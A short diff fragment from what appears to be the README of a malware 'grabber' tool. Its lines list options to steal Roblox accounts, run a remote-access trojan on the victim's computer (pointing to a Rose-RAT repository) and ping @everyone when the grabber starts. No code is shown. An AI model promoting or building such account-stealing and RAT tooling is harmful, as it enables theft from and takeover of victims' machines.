@@ -19,5 +19,4 @@ Roblox: Grabs Roblox accounts
 [Advanced]
 RAT: Runs a RAT on the victim's computer. (see github.com/DamagingRose/Rose-RAT)
 Ping: ping @everyone once the grabber is started 
-
 ```
